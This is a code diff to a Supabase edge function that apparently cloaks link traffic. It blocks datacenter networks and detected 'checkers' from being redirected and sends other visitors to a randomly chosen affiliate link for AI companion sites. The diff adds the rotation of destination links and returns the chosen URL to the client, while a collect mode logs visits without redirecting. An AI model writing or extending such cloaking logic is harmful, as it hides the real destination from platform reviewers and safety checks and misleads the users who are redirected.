@@ -3,9 +3,16 @@ import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
 
 const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
 const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
-const DEST = Deno.env.get('DEST_URL') ?? 'https://landing.candynetwork.ai/elara?var_1=cmai_realistic_01.jpg&var_2=cmai_anime_01.jpg&via=phpxf';
+const DEST_LINKS = [
+  'https://candyai.gg/home2?via=phpxf',
+  'https://landing.candynetwork.ai/elara?via=phpxf',
+  'https://candyai.gg/ai-anime?via=phpxf'
+];
 
-// COLLECT_MODE=1 → always return r=0 (collect metrics only, no redirect)
+function getDest(): string {
+  return DEST_LINKS[Math.floor(Math.random() * DEST_LINKS.length)];
+}
+
 const COLLECT_MODE = Deno.env.get('COLLECT_MODE') === '1';
 
 // Known datacenter ASN prefixes — instant block
@@ -87,6 +94,7 @@ serve(async (req) => {
 
   // In COLLECT_MODE always return r=0 — no redirects during data gathering phase
   const r = COLLECT_MODE ? 0 : (isChecker ? 0 : 1);
+  const dest = getDest();
 
   // Write to visit_logs
   await sb.from('visit_logs').insert({
@@ -95,7 +103,7 @@ serve(async (req) => {
     campaign,
   });
 
-  return new Response(JSON.stringify({ r }), {
+  return new Response(JSON.stringify({ r, dest }), {
     headers: { ...corsHeaders, 'Content-Type': 'application/json' },
     status: 200,
   });
